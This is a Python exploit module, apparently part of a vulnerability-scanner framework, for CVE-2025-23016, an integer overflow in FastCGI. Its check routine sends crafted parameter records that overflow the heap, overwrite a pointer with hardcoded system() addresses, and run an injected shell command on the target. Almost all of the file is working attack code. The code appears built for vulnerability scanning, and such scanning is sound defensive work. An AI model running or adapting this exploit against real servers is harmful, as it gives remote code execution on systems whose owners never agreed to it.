"""FastCGI Integer Overflow Exploit - CVE-2025-23016"""

import datetime
import logging
import random
import socket
import struct
import time

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = "FastCGI Integer Overflow Leading to Remote Code Execution"
VULNERABILITY_REFERENCE = "CVE-2025-23016"
VULNERABILITY_DESCRIPTION = """
An integer overflow vulnerability in the FastCGI library allows remote attackers 
 to execute arbitrary code via crafted parameters that trigger a heap buffer overflow.
This vulnerability occurs when processing parameter sizes in the ReadParams function,
where the calculation nameLen + valueLen + 2 can overflow on 32-bit systems.
"""
RISK_RATING = "CRITICAL"
DEFAULT_TIMEOUT = datetime.timedelta(seconds=10)
DEFAULT_FASTCGI_PORT = 9000

# FastCGI constants
FCGI_BEGIN_REQUEST = 1
FCGI_PARAMS = 4
FCGI_STDIN = 5
FCGI_STDOUT = 6
FCGI_END_REQUEST = 3
FCGI_RESPONDER = 1
FCGI_VERSION = 1
FCGI_RESERVED = 0

# Verification file details
VERIFICATION_FILE = "/tmp/fcgi_vuln_check"
VERIFICATION_CONTENT = str(random.randint(10000, 99999))

# Set up logging
logging.basicConfig(
    level=logging.DEBUG,  # Change to INFO or ERROR for less verbosity
    format="%(asctime)s - %(levelname)s - %(message)s",
)


def _make_header(
    req_type: int, req_id: int, content_length: int, padding_length: int = 0
) -> bytes:
    """
    Create a FastCGI header according to the protocol specification.
    """
    return struct.pack(
        ">BBHHBB",
        FCGI_VERSION,
        req_type,
        req_id,
        content_length,
        padding_length,
        FCGI_RESERVED,
    )


def _make_begin_request_body(role: int, flags: int = 0) -> bytes:
    """
    Create a FastCGI begin request body.
    """
    return struct.pack(
        ">HB5s",
        role,
        flags,
        b"\x00" * 5,
    )


def encode_param(name: bytes, value: bytes) -> bytes:
    """
    Encode a parameter for the FastCGI protocol.
    """
    name_len = len(name)
    value_len = len(value)
    result = b""

    if name_len < 0x80:
        result += struct.pack("B", name_len)
    else:
        result += struct.pack(">I", name_len | 0x80000000)

    if value_len < 0x80:
        result += struct.pack("B", value_len)
    else:
        result += struct.pack(">I", value_len | 0x80000000)

    return result + name + value


@exploits_registry.register
class FastCGIIntegerOverflowExploit(webexploit.WebExploit):
    """
    CVE-2025-23016: FastCGI Integer Overflow Exploit
    """

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )

    def accept(self, target: definitions.Target) -> bool:
        try:
            host = target.host
            port = target.port or DEFAULT_FASTCGI_PORT

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(DEFAULT_TIMEOUT.seconds)
            s.connect((host, port))

            # Send a valid FastCGI begin request
            body = _make_begin_request_body(FCGI_RESPONDER)
            s.sendall(_make_header(FCGI_BEGIN_REQUEST, 1, len(body)) + body)
            try:
                response = s.recv(8, socket.MSG_PEEK)
                s.close()
                if len(response) > 0:
                    return True
                else:
                    return False
            except socket.timeout:
                s.close()
                return False
        except (socket.error, ConnectionRefusedError):
            return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        vulnerabilities: list[definitions.Vulnerability] = []
        system_addresses = [0x80490B0, 0x8048490, 0x8048380]
        try:
            host = target.host
            port = target.port or DEFAULT_FASTCGI_PORT

            for system_addr in system_addresses:
                # Crash to reset heap
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(DEFAULT_TIMEOUT.seconds)
                s.connect((host, port))
                s.sendall(
                    _make_header(FCGI_BEGIN_REQUEST, 1, 8)
                    + _make_begin_request_body(FCGI_RESPONDER)
                )
                s.sendall(_make_header(FCGI_PARAMS, 1, 8) + b"\xff" * 8)
                s.close()
                time.sleep(1)

                # Exploit attempt
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(DEFAULT_TIMEOUT.seconds)
                s.connect((host, port))
                s.sendall(
                    _make_header(FCGI_BEGIN_REQUEST, 1, 8)
                    + _make_begin_request_body(FCGI_RESPONDER)
                )

                params = b""
                for i in range(9):
                    params += encode_param(f"param{i}".encode(), b"B" * 0x26)
                for i in range(2):
                    params += encode_param(f"small{i}".encode(), b"S" * 4)

                # Overflow marker
                params += struct.pack(">I", 0xFFFFFFFF) + struct.pack(">I", 0xFFFFFFFF)

                cmd = (
                    f" /bi;echo {VERIFICATION_CONTENT} > {VERIFICATION_FILE};#".encode()
                )
                payload = b"A" * 16
                payload += cmd.ljust(16, b"\x00")
                payload += b"\x00" * 12
                payload += struct.pack("<I", system_addr)
                params += payload

                s.sendall(_make_header(FCGI_PARAMS, 1, len(params)) + params)
                s.sendall(_make_header(FCGI_PARAMS, 1, 0))
                s.sendall(_make_header(FCGI_STDIN, 1, 0))
                s.close()
                time.sleep(1)

                # Verification read
                response_data = b""
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(DEFAULT_TIMEOUT.seconds)
                s.connect((host, port))
                s.sendall(
                    _make_header(FCGI_BEGIN_REQUEST, 1, 8)
                    + _make_begin_request_body(FCGI_RESPONDER)
                )
                params = encode_param(b"QUERY_STRING", b"uptime")
                params += encode_param(
                    b"SCRIPT_FILENAME", f"echo $({VERIFICATION_FILE})".encode()
                )
                s.sendall(_make_header(FCGI_PARAMS, 1, len(params)) + params)
                s.sendall(_make_header(FCGI_PARAMS, 1, 0))
                s.sendall(_make_header(FCGI_STDIN, 1, 0))

                while True:
                    try:
                        chunk = s.recv(1024)
                    except socket.timeout:
                        break
                    if chunk == b"":
                        break
                    response_data += chunk
                    if len(chunk) < 1024:
                        break
                s.close()

                if VERIFICATION_CONTENT.encode() in response_data:
                    vulnerabilities.append(self.create_vulnerability(target))
                    return vulnerabilities

            return vulnerabilities
        except (socket.timeout, socket.error):
            return vulnerabilities
